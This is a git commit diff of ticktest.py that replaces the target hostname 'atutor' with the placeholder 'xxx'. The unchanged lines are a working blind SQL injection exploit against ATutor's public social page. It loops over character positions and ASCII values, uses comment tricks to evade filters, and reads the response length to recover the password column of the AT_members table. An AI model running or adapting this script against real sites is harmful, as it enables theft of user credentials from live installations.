61326b366d2c3fce00b61864143926ceb29795ef
rortega <ortega.r.rafael@gmail.com>
2024-01-11 13:20:00 -0600

    Update ticktest.py

--- ticktest.py
+++ ticktest.py
@@ -7,7 +7,7 @@ for i in range(1,40):
     for j in range(32,126):
         true = "(select/**/ascii(substring((select/**/password/**/from/**/AT_members),%s,1)))=%s" % (i,j)
         base = "q=x%27)/**/or/**/"+true+";%23"
-        url = "http://atutor/ATutor/mods/_standard/social/index_public.php?"
+        url = "http://xxx/xxx/mods/_standard/social/index_public.php?"
         res = requests.get(url + base )
         if(res.headers['Content-Length'] == "180"):
             print(chr(j),end='')
